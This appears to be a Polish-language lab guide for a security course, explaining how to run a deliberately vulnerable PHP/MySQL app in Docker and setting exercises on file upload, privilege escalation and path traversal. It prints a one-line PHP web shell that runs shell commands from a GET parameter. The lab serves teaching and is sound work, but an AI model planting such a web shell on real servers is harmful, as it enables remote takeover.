# Instrukcja do części praktycznej

## Konfiguracja środowiska

W celu zainstalowania aplikacji zalecamy skorzystanie z docker-compose.

https://docs.docker.com/compose/install/

Oczywiście kod źródłowy aplikacji jest dla Ciebie dostępny, więc jeśli wolisz wykonać zadanie
w np. XAMPP'ie, to aplikacja powinna uruchomić się bez problemu, jednakże niniejsza instrukcja jest napisana z myślą o docker-compose.

### O aplikacji

Aplikacja, którą będziesz poddawać testowi została napisana w języku PHP (8.2.25) i działa na serwerze Apache. Ponad to korzysta ona z serwera bazodanowego MySQL (MariaDB).

W katalogu src znajdziesz kod źródłowy strony. Chcąc zmienić dane
dostępowe do bazy danych należy zmodyfikować plik src/lib/connect.php. Plik
inicjalizujący bazę danych znajduje się w ścieżce config/init.sql. Zawarte są
w nim kwerendy odpowiedzialne za utworzenie odpowiednich tabel i rekordów. Jeśli
utkniesz w trakcie wykonywania zadania, to możesz śmiało zajrzeć do tego pliku w poszukiwaniu
informacji o strukturze bazy danych.

### Instalacja

Pliki docker-compose.yml i Dockerfile pomogą Ci w szybkim postawieniu apliakcji.
Jeśli podążasz za naszym zaleceniem, to nie ingeruj w pliki konfiguracyjne aplikacji (no chyba, że napotkasz jakiś problem).

Upewnij się, że silnik Docker'a jest uruchomiony. Możesz to sprawdzić w panelu Docker Desktop.
Następnie w folderze docker użyj komendy:

```sh
docker-compose up --build
```

Terminal powinien wskazać Ci uruchomienie się 3 kontenerów: php-apache-container,
mysql-container i phpmyadmin-container. Pierwszy i ostatni powinny uruchomić się
szybko i bez problemu, natomiast mysql-container uruchomi się 3 razy i będzie gotowy dopiero
gdy pojawi się komunikat:

```
... [System] [MY-010931] [Server] /usr/sbin/mysqld: ready for connections. ...
```

W katalogu docker powinien zostać utworzony folder mysql-data. To ważny katalog z perspektywy aplikacji, bo mieści w sobie całą bazę danych. Z racji tego, że nie znajduje się on wewnątrz kontenera, ale na Twoim dysku, to nie musisz martwić się o utratę danych po wyłączeniu aplikacji.

Aby wejść do aplikacji należy odwiedzić localhost:8080.

```
Login: baim
Hasło: baim
```

Aby wejść do panelu phpmyadmin należy odwiedzić localhost:8081. \
Phpmyadmin to aplikacja, która może Ci się przydać do modyfikowania rekordów w tabelach bazy danych.

```
Login: root
Hasło: root
```

Aby zakończyć działanie docker-compose użyj kombinacji CTRL-C.

### O zadaniach

Teraz możesz przystąpić do wykonywania zadań. Zachęcamy Cię, abyś spróbował(-ła) zmierzyć się z zadaniami bez zaglądania do podpowiedzi i rozwiązań, jeśli jednak nie czujesz się na siłach, to możesz śmiało po nie sięgać. Zostały one napisane w taki sposób, abyś nie czuł(-ła) się zagubiony(-a). Do każdej części zadania zostało dolączone wytłumaczenie mechaniki danego kroku, które najlepiej poczytać po ukończeniu zadania.

Korzystaj również z kodu źródłowego, jeśli uznasz to za konieczne. Być może jest to Twoja pierwsza styczność z PHP. Dla uspokojenia, jego składnia przypomina mieszankę C i Javascript, więc nie powinieneś(-aś) mieć problemów ze zrozumieniem kodu na poziomie abstrakcji.

Powodzenia!

## Zadanie 1

1. Zapoznaj się z działaniem aplikacji. Zajrzyj do kodu źródłowego i spróbuj zrozumieć zasadę jej działania (NIE analizuj dogłębnie linia po linii).

Jak zaimplementowane jest uwierzytelnianie? \
Jak zaimplementowana jest autoryzacja? \
Jak wczytywane są fragmenty strony? \
[Jak działa aplikacja? [PODPOWIEDŹ]](hints/ex1/1_1_hint.md) \
[Struktura aplikacji [MECHANIKA]](hints/ex1/1_mechanics.md)

2. Wyślij złośliwy moduł

Może to być najprostszy możliwy plik o treści:

```php
<?php
  echo "Hello! I'm evil.";
?>
```

lub też kod RCE:

```php
<?php
  echo shell_exec($_GET['cmd']);
?>
```

gdzie $\_GET['cmd'] przyjmuję wartość pola "cmd" z zapytania GET.

Jakie pliki przyjmuje formularz? \
Gdzie są one przechowywane? \
[Jak wysłać złośliwy kod? [PODPOWIEDŹ]](hints/ex1/2_1_hint.md) \
[Wykonanie [ROZWIĄZANIE]](hints/ex1/2_solution.md) \
[Dlaczego tak się da? [MECHANIKA]](hints/ex1/2_mechanics.md)

3. Przyznaj swojemu użytkownikowi uprawnienia do wykonania złośliwego modułu.

Jakie informacje o użytkowniku przechowuje baza danych? \
Czy któraś z kolumn może być nadużyta?

[Jak wygląda struktura bazy danych? [PODPOWIEDŹ]](hints/ex1/3_1_hint.md) \
[Jak to wykonać? [PODPOWIEDŹ]](hints/ex1/3_2_hint.md) \
[Wykonanie [ROZWIĄZANIE]](hints/ex1/3_solution.md) \
[Dlaczego tak się da? [MECHANIKA]](hints/ex1/3_mechanics.md)

4. Uruchom złośliwy moduł

[[MECHANIKA]](hints/ex1/4_mechanics.md)

## Zadanie 2

Czy jest możliwe wykonanie ataku path traversal głębiej niż aplikacja na to pozwala? Wykorzystaj do tego celu narzędzia poznane na laboratoriach.

[Jak się za to zabrać? [PODPOWIEDŹ]](hints/ex2/1_hint.md) \
[Wykonanie [ROZWIĄZANIE]](hints/ex2/1_solution.md) \
[Jaki jest tego powód? [MECHANIKA]](hints/ex2/1_mechanics.md)
